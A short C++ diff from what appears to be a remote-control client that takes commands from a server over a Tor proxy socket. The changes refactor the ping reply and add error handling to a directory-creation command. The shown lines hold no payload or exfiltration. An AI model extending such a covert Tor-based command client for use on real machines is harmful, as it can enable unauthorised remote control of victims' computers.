@@ -158,7 +158,7 @@ public:
             }
             std::string cmd = cmdBuff; // Convert for easier handling
             if (cmd == "ping;") {
-                torSock.proxySend("ping;pong;", 11); // This is used by the server to check if the client is still connected and responsive
+                torSock.proxySendStr("ping;pong;");
             }
             else if (cmd == "pwd;") { // Print Working Directory
                 this->pwd();
@@ -228,7 +228,13 @@ public:
     }
 
     void mkdir(std::string path) {
-        this->torSock.proxySendStr("mkdir;" + path + ((std::filesystem::create_directories(path)) ? ";success;" : ";failed;"));
+        try {
+            std::filesystem::create_directories(path);
+            this->torSock.proxySendStr("mkdir;" + path + ";success;");
+        }
+        catch (...) {
+            this->torSock.proxySendStr("mkdir;" + path + ";failed;");
+        }
     }
 
     /*
